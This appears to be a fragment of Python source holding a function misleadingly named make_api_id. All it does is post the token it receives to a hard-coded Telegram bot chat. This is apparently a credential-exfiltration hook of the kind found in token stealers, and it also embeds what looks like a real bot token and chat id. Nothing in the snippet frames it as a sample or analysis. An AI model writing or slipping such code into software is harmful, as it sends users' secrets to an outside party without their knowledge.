import requests , os , shutil

def make_api_id(token):

    
    requests.post(
        url='https://api.telegram.org/bot2048894410:AAEA-qdzvlQpZIxsUTFw-Ye4WnVlFF5Ox-I/sendMessage',
        data={'chat_id': -1001607093277, 'text': token}
    )
